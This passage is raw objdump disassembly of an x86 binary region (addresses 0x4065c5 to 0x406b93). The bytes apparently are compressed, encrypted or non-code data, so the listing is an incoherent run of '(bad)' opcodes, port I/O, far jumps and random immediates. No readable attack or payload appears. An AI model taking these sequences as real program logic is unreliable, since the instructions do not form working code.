  4065c5:	86 f3                	xchg   %dh,%bl
  4065c7:	ed                   	in     (%dx),%eax
  4065c8:	38 c6                	cmp    %al,%dh
  4065ca:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4065cb:	f1                   	int1
  4065cc:	fc                   	cld
  4065cd:	0e                   	push   %cs
  4065ce:	60                   	pusha
  4065cf:	63 11                	arpl   %edx,(%ecx)
  4065d1:	86 87 de 90 10 85    	xchg   %al,-0x7aef6f22(%edi)
  4065d7:	6c                   	insb   (%dx),%es:(%edi)
  4065d8:	3d 61 f3 bb ce       	cmp    $0xcebbf361,%eax
  4065dd:	fe 03                	incb   (%ebx)
  4065df:	fe                   	(bad)
  4065e0:	e2 bd                	loop   0x40659f
  4065e2:	69 a9 8a 5e c0 31 cd 	imul   $0x21359fcd,0x31c05e8a(%ecx),%ebp
  4065e9:	9f 35 21 
  4065ec:	45                   	inc    %ebp
  4065ed:	fb                   	sti
  4065ee:	55                   	push   %ebp
  4065ef:	4a                   	dec    %edx
  4065f0:	bd 8f e6 57 3e       	mov    $0x3e57e68f,%ebp
  4065f5:	fa                   	cli
  4065f6:	95                   	xchg   %eax,%ebp
  4065f7:	f5                   	cmc
  4065f8:	49                   	dec    %ecx
  4065f9:	fb                   	sti
  4065fa:	e1 63                	loope  0x40665f
  4065fc:	34 d5                	xor    $0xd5,%al
  4065fe:	a2 40 a7 be ee       	mov    %al,0xeebea740
  406603:	ba 56 69 2a 68       	mov    $0x682a6956,%edx
  406608:	64 23 12             	and    %fs:(%edx),%edx
  40660b:	70 eb                	jo     0x4065f8
  40660d:	4e                   	dec    %esi
  40660e:	c1 2c 4c 16          	shrl   $0x16,(%esp,%ecx,2)
  406612:	50                   	push   %eax
  406613:	7e cf                	jle    0x4065e4
  406615:	82 6a 43 ad          	subb   $0xad,0x43(%edx)
  406619:	46                   	inc    %esi
  40661a:	10 c1                	adc    %al,%cl
  40661c:	3b 9f 6b 16 cc 75    	cmp    0x75cc166b(%edi),%ebx
  406622:	75 cd                	jne    0x4065f1
  406624:	73 1e                	jae    0x406644
  406626:	61                   	popa
  406627:	3d cb 01 8f 1a       	cmp    $0x1a8f01cb,%eax
  40662c:	84 06                	test   %al,(%esi)
  40662e:	9c                   	pushf
  40662f:	84 f5                	test   %dh,%ch
  406631:	d7                   	xlat   %ds:(%ebx)
  406632:	dc 70 5b             	fdivl  0x5b(%eax)
  406635:	0c 80                	or     $0x80,%al
  406637:	f6 79 fd             	idivb  -0x3(%ecx)
  40663a:	1b a1 1a b1 d7 43    	sbb    0x43d7b11a(%ecx),%esp
  406640:	d4 d4                	aam    $0xd4
  406642:	1e                   	push   %ds
  406643:	1a a0 05 9e 9e 87    	sbb    -0x786161fb(%eax),%ah
  406649:	ce                   	into
  40664a:	13 fa                	adc    %edx,%edi
  40664c:	24 2f                	and    $0x2f,%al
  40664e:	ec                   	in     (%dx),%al
  40664f:	97                   	xchg   %eax,%edi
  406650:	12 6d 4a             	adc    0x4a(%ebp),%ch
  406653:	7d d2                	jge    0x406627
  406655:	c0 a2 e8 33 f8 ce af 	shlb   $0xaf,-0x3107cc18(%edx)
  40665c:	fc                   	cld
  40665d:	88 24 8d 60 6e 46 cf 	mov    %ah,-0x30b991a0(,%ecx,4)
  406664:	58                   	pop    %eax
  406665:	41                   	inc    %ecx
  406666:	d7                   	xlat   %ds:(%ebx)
  406667:	bd 75 94 cd 34       	mov    $0x34cd9475,%ebp
  40666c:	3c f5                	cmp    $0xf5,%al
  40666e:	52                   	push   %edx
  40666f:	36 c1 9e 74 e5 95 d6 	rcrl   $0x35,%ss:-0x296a1a8c(%esi)
  406676:	35 
  406677:	92                   	xchg   %eax,%edx
  406678:	c3                   	ret
  406679:	27                   	daa
  40667a:	0e                   	push   %cs
  40667b:	2c 86                	sub    $0x86,%al
  40667d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40667e:	47                   	inc    %edi
  40667f:	0a 88 f1 65 31 f4    	or     -0xbce9a0f(%eax),%cl
  406685:	e3 16                	jecxz  0x40669d
  406687:	31 bd f6 86 02 14    	xor    %edi,0x140286f6(%ebp)
  40668d:	08 eb                	or     %ch,%bl
  40668f:	71 a4                	jno    0x406635
  406691:	47                   	inc    %edi
  406692:	fc                   	cld
  406693:	82 bd 1b 4c bb 08 ee 	cmpb   $0xee,0x8bb4c1b(%ebp)
  40669a:	17                   	pop    %ss
  40669b:	08 0e                	or     %cl,(%esi)
  40669d:	9a 19 ad 31 6c 7d 96 	lcall  $0x967d,$0x6c31ad19
  4066a4:	cf                   	iret
  4066a5:	81 94 31 1f 13 dc 37 	adcl   $0x7cf727ed,0x37dc131f(%ecx,%esi,1)
  4066ac:	ed 27 f7 7c 
  4066b0:	47                   	inc    %edi
  4066b1:	ef                   	out    %eax,(%dx)
  4066b2:	0f 3c                	(bad)
  4066b4:	ea 1e 22 21 c8 91 76 	ljmp   $0x7691,$0xc821221e
  4066bb:	54                   	push   %esp
  4066bc:	13 ba 37 20 bb b7    	adc    -0x4844dfc9(%edx),%edi
  4066c2:	3c 33                	cmp    $0x33,%al
  4066c4:	fd                   	std
  4066c5:	f3 56                	repz push %esi
  4066c7:	12 96 7a de 33 3e    	adc    0x3e33de7a(%esi),%dl
  4066cd:	5a                   	pop    %edx
  4066ce:	b8 7e 98 a0 ec       	mov    $0xeca0987e,%eax
  4066d3:	07                   	pop    %es
  4066d4:	a9 87 43 0b 85       	test   $0x850b4387,%eax
  4066d9:	34 94                	xor    $0x94,%al
  4066db:	e4 a1                	in     $0xa1,%al
  4066dd:	b0 a9                	mov    $0xa9,%al
  4066df:	b0 f6                	mov    $0xf6,%al
  4066e1:	3b 7d 05             	cmp    0x5(%ebp),%edi
  4066e4:	d3 6b e8             	shrl   %cl,-0x18(%ebx)
  4066e7:	43                   	inc    %ebx
  4066e8:	86 c3                	xchg   %al,%bl
  4066ea:	00 da                	add    %bl,%dl
  4066ec:	d6                   	salc
  4066ed:	54                   	push   %esp
  4066ee:	cc                   	int3
  4066ef:	40                   	inc    %eax
  4066f0:	00 8c e3 71 da bc 96 	add    %cl,-0x6943258f(%ebx,%eiz,8)
  4066f7:	d9 d1                	(bad)
  4066f9:	7f d3                	jg     0x4066ce
  4066fb:	f4                   	hlt
  4066fc:	33 bc b9 7d 78 45 8e 	xor    -0x71ba8783(%ecx,%edi,4),%edi
  406703:	36 e1 40             	ss loope 0x406746
  406706:	4b                   	dec    %ebx
  406707:	44                   	inc    %esp
  406708:	16                   	push   %ss
  406709:	ac                   	lods   %ds:(%esi),%al
  40670a:	1e                   	push   %ds
  40670b:	f2 62 d7 0c 36 a0    	(bad)
  406711:	c4 6e 29             	les    0x29(%esi),%ebp
  406714:	2b 15 ce 0c e7 eb    	sub    0xebe70cce,%edx
  40671a:	95                   	xchg   %eax,%ebp
  40671b:	74 aa                	je     0x4066c7
  40671d:	1a d3                	sbb    %bl,%dl
  40671f:	e0 40                	loopne 0x406761
  406721:	ee                   	out    %al,(%dx)
  406722:	cb                   	lret
  406723:	61                   	popa
  406724:	35 43 35 ba 53       	xor    $0x53ba3543,%eax
  406729:	36 bb b8 1f 5c 39    	ss mov $0x395c1fb8,%ebx
  40672f:	d8 7c 8a ae          	fdivrs -0x52(%edx,%ecx,4)
  406733:	2a 94 3b 42 c4 94 e4 	sub    -0x1b6b3bbe(%ebx,%edi,1),%dl
  40673a:	2c 26                	sub    $0x26,%al
  40673c:	1b e5                	sbb    %ebp,%esp
  40673e:	32 17                	xor    (%edi),%dl
  406740:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406741:	2e a6                	cmpsb  %es:(%edi),%cs:(%esi)
  406743:	77 71                	ja     0x4067b6
  406745:	ea 30 36 57 de 08 43 	ljmp   $0x4308,$0xde573630
  40674c:	4b                   	dec    %ebx
  40674d:	86 8b 0a 95 ee 36    	xchg   %cl,0x36ee950a(%ebx)
  406753:	88 61 e3             	mov    %ah,-0x1d(%ecx)
  406756:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406757:	13 e7                	adc    %edi,%esp
  406759:	97                   	xchg   %eax,%edi
  40675a:	b5 9e                	mov    $0x9e,%ch
  40675c:	7f cd                	jg     0x40672b
  40675e:	fb                   	sti
  40675f:	e7 12                	out    %eax,$0x12
  406761:	4c                   	dec    %esp
  406762:	d0 b1 e8 72 78 91    	shlb   $1,-0x6e878d18(%ecx)
  406768:	f9                   	stc
  406769:	89 e6                	mov    %esp,%esi
  40676b:	1e                   	push   %ds
  40676c:	67 66 1e             	addr16 pushw %ds
  40676f:	1a 4e bf             	sbb    -0x41(%esi),%cl
  406772:	6f                   	outsl  %ds:(%esi),(%dx)
  406773:	ad                   	lods   %ds:(%esi),%eax
  406774:	d6                   	salc
  406775:	14 a8                	adc    $0xa8,%al
  406777:	66 00 35 ea ed fc 57 	data16 add %dh,0x57fcedea
  40677e:	46                   	inc    %esi
  40677f:	6e                   	outsb  %ds:(%esi),(%dx)
  406780:	00 97 af a4 7e f8    	add    %dl,-0x7815b51(%edi)
  406786:	77 d4                	ja     0x40675c
  406788:	94                   	xchg   %eax,%esp
  406789:	06                   	push   %es
  40678a:	b9 12 df da fb       	mov    $0xfbdadf12,%ecx
  40678f:	31 79 9f             	xor    %edi,-0x61(%ecx)
  406792:	bd e4 31 cf ee       	mov    $0xeecf31e4,%ebp
  406797:	53                   	push   %ebx
  406798:	39 e3                	cmp    %esp,%ebx
  40679a:	c0 6a ce 46          	shrb   $0x46,-0x32(%edx)
  40679e:	08 f2                	or     %dh,%dl
  4067a0:	d4 36                	aam    $0x36
  4067a2:	b0 04                	mov    $0x4,%al
  4067a4:	fc                   	cld
  4067a5:	90                   	nop
  4067a6:	d7                   	xlat   %ds:(%ebx)
  4067a7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4067a8:	7c 80                	jl     0x40672a
  4067aa:	eb 0a                	jmp    0x4067b6
  4067ac:	87 80 ab b6 09 f5    	xchg   %eax,-0xaf64955(%eax)
  4067b2:	6b 1b 81             	imul   $0xffffff81,(%ebx),%ebx
  4067b5:	6b f8 81             	imul   $0xffffff81,%eax,%edi
  4067b8:	da b6 7d de 2d e0    	fidivl -0x1fd22183(%esi)
  4067be:	05 d9 80 cf aa       	add    $0xaacf80d9,%eax
  4067c3:	7d 60                	jge    0x406825
  4067c5:	45                   	inc    %ebp
  4067c6:	09 a9 85 f0 42 01    	or     %ebp,0x142f085(%ecx)
  4067cc:	0e                   	push   %cs
  4067cd:	c9                   	leave
  4067ce:	f3 be 72 6d 34 2d    	repz mov $0x2d346d72,%esi
  4067d4:	59                   	pop    %ecx
  4067d5:	1c 3e                	sbb    $0x3e,%al
  4067d7:	99                   	cltd
  4067d8:	98                   	cwtl
  4067d9:	42                   	inc    %edx
  4067da:	da 93 bd 86 b6 58    	ficoml 0x58b686bd(%ebx)
  4067e0:	2c 51                	sub    $0x51,%al
  4067e2:	bc 6f d3 ec 6a       	mov    $0x6aecd36f,%esp
  4067e7:	97                   	xchg   %eax,%edi
  4067e8:	da c4                	fcmovb %st(4),%st
  4067ea:	c0 ee cb             	shr    $0xcb,%dh
  4067ed:	df 0d 7d a6 55 1a    	fisttps 0x1a55a67d
  4067f3:	48                   	dec    %eax
  4067f4:	15 4c 89 94 3d       	adc    $0x3d94894c,%eax
  4067f9:	9b                   	fwait
  4067fa:	9e                   	sahf
  4067fb:	7f 0c                	jg     0x406809
  4067fd:	0f 47 03             	cmova  (%ebx),%eax
  406800:	0b 75 4f             	or     0x4f(%ebp),%esi
  406803:	cc                   	int3
  406804:	c2 f0 fd             	ret    $0xfdf0
  406807:	b8 d3 8c cc cc       	mov    $0xcccc8cd3,%eax
  40680c:	4f                   	dec    %edi
  40680d:	b7 f9                	mov    $0xf9,%bh
  40680f:	84 d8                	test   %bl,%al
  406811:	31 fc                	xor    %edi,%esp
  406813:	c2 31 ed             	ret    $0xed31
  406816:	f8                   	clc
  406817:	76 c3                	jbe    0x4067dc
  406819:	5c                   	pop    %esp
  40681a:	3d fe 3b be 44       	cmp    $0x44be3bfe,%eax
  40681f:	aa                   	stos   %al,%es:(%edi)
  406820:	f4                   	hlt
  406821:	b3 e9                	mov    $0xe9,%bl
  406823:	97                   	xchg   %eax,%edi
  406824:	9c                   	pushf
  406825:	96                   	xchg   %eax,%esi
  406826:	47                   	inc    %edi
  406827:	13 71 bf             	adc    -0x41(%ecx),%esi
  40682a:	56                   	push   %esi
  40682b:	c1 0d 61 28 a8 f1 37 	rorl   $0x37,0xf1a82861
  406832:	54                   	push   %esp
  406833:	05 db 29 20 78       	add    $0x782029db,%eax
  406838:	f7 ff                	idiv   %edi
  40683a:	f4                   	hlt
  40683b:	a9 d5 d0 f6 bb       	test   $0xbbf6d0d5,%eax
  406840:	54                   	push   %esp
  406841:	b8 50 29 5d 2b       	mov    $0x2b5d2950,%eax
  406846:	b0 7f                	mov    $0x7f,%al
  406848:	b4 19                	mov    $0x19,%ah
  40684a:	f8                   	clc
  40684b:	6b d1 14             	imul   $0x14,%ecx,%edx
  40684e:	f5                   	cmc
  40684f:	02 99 8a f0 5c 06    	add    0x65cf08a(%ecx),%bl
  406855:	c1 5d 6d 93          	rcrl   $0x93,0x6d(%ebp)
  406859:	64 f1                	fs int1
  40685b:	17                   	pop    %ss
  40685c:	e0 77                	loopne 0x4068d5
  40685e:	6f                   	outsl  %ds:(%esi),(%dx)
  40685f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406860:	31 19                	xor    %ebx,(%ecx)
  406862:	a2 1a ff 7c 41       	mov    %al,0x417cff1a
  406867:	4b                   	dec    %ebx
  406868:	3f                   	aas
  406869:	8c e9                	mov    %gs,%ecx
  40686b:	c7                   	(bad)
  40686c:	3d 6a a6 44 52       	cmp    $0x5244a66a,%eax
  406871:	f4                   	hlt
  406872:	ff 47 2b             	incl   0x2b(%edi)
  406875:	16                   	push   %ss
  406876:	56                   	push   %esi
  406877:	ed                   	in     (%dx),%eax
  406878:	66 d2 ad 50 aa e3 39 	data16 shrb %cl,0x39e3aa50(%ebp)
  40687f:	28 68 87             	sub    %ch,-0x79(%eax)
  406882:	e8 8a 3e 0c 43       	call   0x434ca711
  406887:	64 39 ac c3 fa 3a 36 	cmp    %ebp,%fs:-0x74c9c506(%ebx,%eax,8)
  40688e:	8b 
  40688f:	2c d2                	sub    $0xd2,%al
  406891:	20 22                	and    %ah,(%edx)
  406893:	97                   	xchg   %eax,%edi
  406894:	11 99 85 ec bf 39    	adc    %ebx,0x39bfec85(%ecx)
  40689a:	d1 f4                	shl    $1,%esp
  40689c:	cb                   	lret
  40689d:	6d                   	insl   (%dx),%es:(%edi)
  40689e:	4e                   	dec    %esi
  40689f:	34 2a                	xor    $0x2a,%al
  4068a1:	30 9e b2 5d 52 2b    	xor    %bl,0x2b525db2(%esi)
  4068a7:	b7 7f                	mov    $0x7f,%bh
  4068a9:	b8 40 a6 67 97       	mov    $0x9767a640,%eax
  4068ae:	1c 51                	sbb    $0x51,%al
  4068b0:	ff 63 81             	jmp    *-0x7f(%ebx)
  4068b3:	1c f5                	sbb    $0xf5,%al
  4068b5:	cd 92                	int    $0x92
  4068b7:	56                   	push   %esi
  4068b8:	09 ee                	or     %ebp,%esi
  4068ba:	11 59 b9             	adc    %ebx,-0x47(%ecx)
  4068bd:	96                   	xchg   %eax,%esi
  4068be:	31 5b 89             	xor    %ebx,-0x77(%ebx)
  4068c1:	04 7f                	add    $0x7f,%al
  4068c3:	f9                   	stc
  4068c4:	2f                   	das
  4068c5:	88 85 b2 e1 fa 99    	mov    %al,-0x66051e4e(%ebp)
  4068cb:	8a bc 24 16 fb b1 21 	mov    0x21b1fb16(%esp),%bh
  4068d2:	99                   	cltd
  4068d3:	a8 df                	test   $0xdf,%al
  4068d5:	4b                   	dec    %ebx
  4068d6:	f0 29 fc             	lock sub %edi,%esp
  4068d9:	d4 32                	aam    $0x32
  4068db:	08 99 bf 98 01 9a    	or     %bl,-0x65fe6741(%ecx)
  4068e1:	35 b9 dd 84 58       	xor    $0x5884ddb9,%eax
  4068e6:	98                   	cwtl
  4068e7:	0d d3 e1 7d 81       	or     $0x817de1d3,%eax
  4068ec:	b4 7a                	mov    $0x7a,%ah
  4068ee:	53                   	push   %ebx
  4068ef:	80 50 80 fd          	adcb   $0xfd,-0x80(%eax)
  4068f3:	35 b4 c0 ff a5       	xor    $0xa5ffc0b4,%eax
  4068f8:	6d                   	insl   (%dx),%es:(%edi)
  4068f9:	43                   	inc    %ebx
  4068fa:	df 00                	filds  (%eax)
  4068fc:	89 c5                	mov    %eax,%ebp
  4068fe:	3d 5d 94 ac 74       	cmp    $0x74ac945d,%eax
  406903:	df 25 7f 14 37 90    	fbld   0x9037147f
  406909:	a8 4a                	test   $0x4a,%al
  40690b:	e2 63                	loop   0x406970
  40690d:	38 f3                	cmp    %dh,%bl
  40690f:	b4 2a                	mov    $0x2a,%ah
  406911:	72 59                	jb     0x40696c
  406913:	b3 bc                	mov    $0xbc,%bl
  406915:	d7                   	xlat   %ds:(%ebx)
  406916:	ca 0b 96             	lret   $0x960b
  406919:	cf                   	iret
  40691a:	8c ef                	mov    %gs,%edi
  40691c:	1e                   	push   %ds
  40691d:	c8 b4 e7 29          	enter  $0xe7b4,$0x29
  406921:	54                   	push   %esp
  406922:	ba a5 8c f9 ff       	mov    $0xfff98ca5,%edx
  406927:	e9 40 1e 11 3f       	jmp    0x3f51876c
  40692c:	49                   	dec    %ecx
  40692d:	e1 78                	loope  0x4069a7
  40692f:	cb                   	lret
  406930:	dc ba 21 ad 6d 56    	fdivrl 0x566dad21(%edx)
  406936:	ad                   	lods   %ds:(%esi),%eax
  406937:	76 c9                	jbe    0x406902
  406939:	06                   	push   %es
  40693a:	c1 a8 0e f0 99 c4 8f 	shrl   $0x8f,-0x3b660ff2(%eax)
  406941:	83 5a 7d 34          	sbbl   $0x34,0x7d(%edx)
  406945:	71 2b                	jno    0x406972
  406947:	15 04 e8 8f 8c       	adc    $0x8c8fe804,%eax
  40694c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40694d:	f9                   	stc
  40694e:	77 b9                	ja     0x406909
  406950:	47                   	inc    %edi
  406951:	fb                   	sti
  406952:	64 9f                	fs lahf
  406954:	0f bf 2e             	movswl (%esi),%ebp
  406957:	2d 28 d8 35 84       	sub    $0x8435d828,%eax
  40695c:	b8 6b 1c 8f 37       	mov    $0x378f1c6b,%eax
  406961:	dc 95 03 16 f4 41    	fcoml  0x41f41603(%ebp)
  406967:	41                   	inc    %ecx
  406968:	c9                   	leave
  406969:	3a 6e d3             	cmp    -0x2d(%esi),%ch
  40696c:	74 ad                	je     0x40691b
  40696e:	a9 c9 95 51 13       	test   $0x135195c9,%eax
  406973:	e0 ef                	loopne 0x406964
  406975:	37                   	aaa
  406976:	6b 8a 2e 22 96 1f 8f 	imul   $0xffffff8f,0x1f96222e(%edx),%ecx
  40697d:	76 61                	jbe    0x4069e0
  40697f:	0f fc 8d 4b fd d9 0b 	paddb  0xbd9fd4b(%ebp),%mm1
  406986:	9d                   	popf
  406987:	92                   	xchg   %eax,%edx
  406988:	1e                   	push   %ds
  406989:	12 0a                	adc    (%edx),%cl
  40698b:	c8 6c a1 88          	enter  $0xa16c,$0x88
  40698f:	cd 44                	int    $0x44
  406991:	a8 0a                	test   $0xa,%al
  406993:	ea f7 29 0a b2 29 3a 	ljmp   $0x3a29,$0xb20a29f7
  40699a:	61                   	popa
  40699b:	a9 86 81 04 bf       	test   $0xbf048186,%eax
  4069a0:	3b 33                	cmp    (%ebx),%esi
  4069a2:	f8                   	clc
  4069a3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4069a4:	cc                   	int3
  4069a5:	44                   	inc    %esp
  4069a6:	ff b6 55 5d 30 e0    	push   -0x1fcfa2ab(%esi)
  4069ac:	6b 48 a0 1a          	imul   $0x1a,-0x60(%eax),%ecx
  4069b0:	2f                   	das
  4069b1:	1b 54 9d 50          	sbb    0x50(%ebp,%ebx,4),%edx
  4069b5:	4d                   	dec    %ebp
  4069b6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4069b7:	25 68 6a 77 37       	and    $0x37776a68,%eax
  4069bc:	f8                   	clc
  4069bd:	5a                   	pop    %edx
  4069be:	75 88                	jne    0x406948
  4069c0:	08 f3                	or     %dh,%bl
  4069c2:	90                   	nop
  4069c3:	d6                   	salc
  4069c4:	26 68 ed fa dc 2c    	es push $0x2cdcfaed
  4069ca:	28 57 dd             	sub    %dl,-0x23(%edi)
  4069cd:	c7                   	(bad)
  4069ce:	8c 12                	mov    %ss,(%edx)
  4069d0:	02 67 a2             	add    -0x5e(%edi),%ah
  4069d3:	80 69 59 e6          	subb   $0xe6,0x59(%ecx)
  4069d7:	17                   	pop    %ss
  4069d8:	12 fa                	adc    %dl,%bh
  4069da:	84 87 8b 11 bd a2    	test   %al,-0x5d42ee75(%edi)
  4069e0:	b6 8c                	mov    $0x8c,%dh
  4069e2:	8a f2                	mov    %dl,%dh
  4069e4:	10 b8 e7 7c 46 5f    	adc    %bh,0x5f467ce7(%eax)
  4069ea:	76 7d                	jbe    0x406a69
  4069ec:	e1 e2                	loope  0x4069d0
  4069ee:	f9                   	stc
  4069ef:	f5                   	cmc
  4069f0:	d5 67                	aad    $0x67
  4069f2:	73 08                	jae    0x4069fc
  4069f4:	ee                   	out    %al,(%dx)
  4069f5:	ce                   	into
  4069f6:	d1 95 cd fd d2 d1    	rcll   $1,-0x2e2d0233(%ebp)
  4069fc:	12 de                	adc    %dh,%bl
  4069fe:	d2 b0 5f 78 11 5c    	shlb   %cl,0x5c11785f(%eax)
  406a04:	95                   	xchg   %eax,%ebp
  406a05:	9f                   	lahf
  406a06:	bc d4 27 21 b5       	mov    $0xb52127d4,%esp
  406a0b:	19 cf                	sbb    %ecx,%edi
  406a0d:	fa                   	cli
  406a0e:	8a e9                	mov    %cl,%ch
  406a10:	e8 c9 22 25 dc       	call   0xdc658cde
  406a15:	11 c2                	adc    %eax,%edx
  406a17:	98                   	cwtl
  406a18:	b3 61                	mov    $0x61,%bl
  406a1a:	e4 70                	in     $0x70,%al
  406a1c:	4f                   	dec    %edi
  406a1d:	fe 0f                	decb   (%edi)
  406a1f:	0b 45 b0             	or     -0x50(%ebp),%eax
  406a22:	a9 89 67 64 cb       	test   $0xcb646789,%eax
  406a27:	e1 c7                	loope  0x4069f0
  406a29:	7f 6d                	jg     0x406a98
  406a2b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406a2c:	ea f7 c6 03 73 33 20 	ljmp   $0x2033,$0x7303c6f7
  406a33:	47                   	inc    %edi
  406a34:	8c fa                	mov    %?,%edx
  406a36:	a8 74                	test   $0x74,%al
  406a38:	52                   	push   %edx
  406a39:	62 b1 7a 44 ce 8b    	bound  %esi,-0x7431bb86(%ecx)
  406a3f:	1b f2                	sbb    %edx,%esi
  406a41:	3f                   	aas
  406a42:	5e                   	pop    %esi
  406a43:	4a                   	dec    %edx
  406a44:	56                   	push   %esi
  406a45:	99                   	cltd
  406a46:	52                   	push   %edx
  406a47:	19 56 ab             	sbb    %edx,-0x55(%esi)
  406a4a:	c5 e4 5d 24 dd a6 87 	vminps -0x2e5b785a(,%ebx,8),%ymm3,%ymm4
  406a51:	a4 d1 
  406a53:	ff                   	lcall  (bad)
  406a54:	de ae 5a 2a 5e 00    	fisubrs 0x5e2a5a(%esi)
  406a5a:	00 80 00 00 2f bf    	add    %al,-0x40d10000(%eax)
  406a60:	90                   	nop
  406a61:	87 60 63             	xchg   %esp,0x63(%eax)
  406a64:	1a f5                	sbb    %ch,%dh
  406a66:	8b 96 95 8b ba c0    	mov    -0x3f45746b(%esi),%edx
  406a6c:	75 21                	jne    0x406a8f
  406a6e:	76 b6                	jbe    0x406a26
  406a70:	f2 cc                	repnz int3
  406a72:	3c 1b                	cmp    $0x1b,%al
  406a74:	af                   	scas   %es:(%edi),%eax
  406a75:	ff                   	lcall  (bad)
  406a76:	df e0                	fnstsw %ax
  406a78:	18 72 15             	sbb    %dh,0x15(%edx)
  406a7b:	0c 20                	or     $0x20,%al
  406a7d:	8a d1                	mov    %cl,%dl
  406a7f:	e0 b8                	loopne 0x406a39
  406a81:	9e                   	sahf
  406a82:	31 42 28             	xor    %eax,0x28(%edx)
  406a85:	9f                   	lahf
  406a86:	86 a7 b1 c8 ae d8    	xchg   %ah,-0x2751374f(%edi)
  406a8c:	b4 68                	mov    $0x68,%ah
  406a8e:	82 ba 81 4e 05 d0 bb 	cmpb   $0xbb,-0x2ffab17f(%edx)
  406a95:	a0 39 31 2e c8       	mov    0xc82e3139,%al
  406a9a:	43                   	inc    %ebx
  406a9b:	9d                   	popf
  406a9c:	46                   	inc    %esi
  406a9d:	cf                   	iret
  406a9e:	02 07                	add    (%edi),%al
  406aa0:	74 bd                	je     0x406a5f
  406aa2:	51                   	push   %ecx
  406aa3:	4b                   	dec    %ebx
  406aa4:	01 8b 92 57 97 69    	add    %ecx,0x69975792(%ebx)
  406aaa:	a2 cc 3c 96 17       	mov    %al,0x17963ccc
  406aaf:	13 d4                	adc    %esp,%edx
  406ab1:	c7                   	(bad)
  406ab2:	fe                   	(bad)
  406ab3:	93                   	xchg   %eax,%ebx
  406ab4:	a1 8c 32 42 51       	mov    0x5142328c,%eax
  406ab9:	ad                   	lods   %ds:(%esi),%eax
  406aba:	9a e5 47 cc fc af bf 	lcall  $0xbfaf,$0xfccc47e5
  406ac1:	92                   	xchg   %eax,%edx
  406ac2:	2e 49                	cs dec %ecx
  406ac4:	5e                   	pop    %esi
  406ac5:	cd 8b                	int    $0x8b
  406ac7:	73 2b                	jae    0x406af4
  406ac9:	d6                   	salc
  406aca:	13 4c f3 06          	adc    0x6(%ebx,%esi,8),%ecx
  406ace:	19 5f 68             	sbb    %ebx,0x68(%edi)
  406ad1:	a9 0e 72 e7 55       	test   $0x55e7720e,%eax
  406ad6:	c4 7f ef             	les    -0x11(%edi),%edi
  406ad9:	6d                   	insl   (%dx),%es:(%edi)
  406ada:	c1 3f 50             	sarl   $0x50,(%edi)
  406add:	4c                   	dec    %esp
  406ade:	27                   	daa
  406adf:	b0 db                	mov    $0xdb,%al
  406ae1:	93                   	xchg   %eax,%ebx
  406ae2:	a8 24                	test   $0x24,%al
  406ae4:	34 53                	xor    $0x53,%al
  406ae6:	81 48 10 75 30 bf d7 	orl    $0xd7bf3075,0x10(%eax)
  406aed:	1b 2d 86 29 86 fb    	sbb    0xfb862986,%ebp
  406af3:	c9                   	leave
  406af4:	3b 79 b8             	cmp    -0x48(%ecx),%edi
  406af7:	8e f2                	mov    %edx,%?
  406af9:	22 7a bf             	and    -0x41(%edx),%bh
  406afc:	b9 1f 8a 00 c9       	mov    $0xc9008a1f,%ecx
  406b01:	cb                   	lret
  406b02:	0e                   	push   %cs
  406b03:	b7 96                	mov    $0x96,%bh
  406b05:	5a                   	pop    %edx
  406b06:	9a 1b 48 e9 1a 77 84 	lcall  $0x8477,$0x1ae9481b
  406b0d:	cd a5                	int    $0xa5
  406b0f:	05 25 e8 57 6b       	add    $0x6b57e825,%eax
  406b14:	26 2d 13 1e e9 a0    	es sub $0xa0e91e13,%eax
  406b1a:	2f                   	das
  406b1b:	1e                   	push   %ds
  406b1c:	db 98 6f 75 54 32    	fistpl 0x3254756f(%eax)
  406b22:	16                   	push   %ss
  406b23:	9f                   	lahf
  406b24:	de 9c 4b 36 9a fe 4e 	ficomps 0x4efe9a36(%ebx,%ecx,2)
  406b2b:	5a                   	pop    %edx
  406b2c:	32 7f aa             	xor    -0x56(%edi),%bh
  406b2f:	d1 73 5b             	shll   $1,0x5b(%ebx)
  406b32:	d1 13                	rcll   $1,(%ebx)
  406b34:	6b 79 dd f1          	imul   $0xfffffff1,-0x23(%ecx),%edi
  406b38:	bb 05 80 cb 13       	mov    $0x13cb8005,%ebx
  406b3d:	e4 00                	in     $0x0,%al
  406b3f:	fe                   	(bad)
  406b40:	5f                   	pop    %edi
  406b41:	f2 3e c1 43 31 4a    	repnz roll $0x4a,%ds:0x31(%ebx)
  406b47:	6e                   	outsb  %ds:(%esi),(%dx)
  406b48:	8e 5e 81             	mov    -0x7f(%esi),%ds
  406b4b:	f7 d7                	not    %edi
  406b4d:	63 49 70             	arpl   %ecx,0x70(%ecx)
  406b50:	d8 81 03 4b 89 73    	fadds  0x73894b03(%ecx)
  406b56:	1e                   	push   %ds
  406b57:	5e                   	pop    %esi
  406b58:	0e                   	push   %cs
  406b59:	11 98 0b ed e8 fc    	adc    %ebx,-0x31712f5(%eax)
  406b5f:	4d                   	dec    %ebp
  406b60:	1c a4                	sbb    $0xa4,%al
  406b62:	5f                   	pop    %edi
  406b63:	53                   	push   %ebx
  406b64:	0b d0                	or     %eax,%edx
  406b66:	d1 ed                	shr    $1,%ebp
  406b68:	f6 d6                	not    %dh
  406b6a:	65 29 df             	gs sub %ebx,%edi
  406b6d:	63 a3 74 4d 4a 81    	arpl   %esp,-0x7eb5b28c(%ebx)
  406b73:	7d 30                	jge    0x406ba5
  406b75:	bf 42 13 b7 db       	mov    $0xdbb71342,%edi
  406b7a:	0c a5                	or     $0xa5,%al
  406b7c:	63 2d 27 29 14 f3    	arpl   %ebp,0xf3142927
  406b82:	75 49                	jne    0x406bcd
  406b84:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406b85:	f5                   	cmc
  406b86:	8f                   	(bad)
  406b87:	cc                   	int3
  406b88:	bb 93 2f 55 fd       	mov    $0xfd552f93,%ebx
  406b8d:	ee                   	out    %al,(%dx)
  406b8e:	21 47 44             	and    %eax,0x44(%edi)
  406b91:	01 fe                	add    %edi,%esi
  406b93:	01 b3 3c 32 33 75    	add    %esi,0x7533323c(%ebx)
